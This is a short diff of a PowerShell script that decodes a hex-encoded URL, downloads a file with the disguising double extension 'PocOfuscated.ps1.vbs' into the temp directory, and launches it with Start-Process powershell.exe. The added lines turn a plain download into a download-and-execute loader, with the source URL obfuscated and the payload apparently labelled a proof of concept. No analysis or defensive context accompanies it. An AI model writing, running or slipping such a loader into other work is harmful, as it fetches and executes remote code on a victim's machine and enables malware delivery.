@@ -3,4 +3,14 @@ $url = ""
 for ($i = 0; $i -lt $hex.Length; $i += 2) {
     $url += [char][convert]::ToUInt32($hex.Substring($i, 2), 16);
 }
-Invoke-WebRequest -Uri $url -OutFile "PocOfuscated.ps1.vbs"
+
+
+$tempDir = [System.IO.Path]::GetTempPath()
+
+
+$filePath = Join-Path -Path $tempDir -ChildPath "PocOfuscated.ps1.vbs"
+
+
+Invoke-WebRequest -Uri $url -OutFile $filePath
+
+Start-Process powershell.exe -ArgumentList -File `"$filePath`"
